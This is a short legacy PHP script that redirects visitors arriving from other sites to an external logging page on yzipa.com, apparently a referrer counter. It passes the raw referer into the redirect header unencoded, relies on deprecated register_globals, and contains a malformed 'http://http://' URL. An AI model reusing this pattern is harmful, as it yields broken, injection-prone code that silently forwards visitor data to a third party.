<?
$referer = $HTTP_REFERER;
if ($referer != str_replace($HTTP_HOST , "" , $referer)) {exit;}
@header ("location: http://http://www.yzipa.com/admin/log/nalogd.php?counter=daylife&url=$referer");
exit;
?>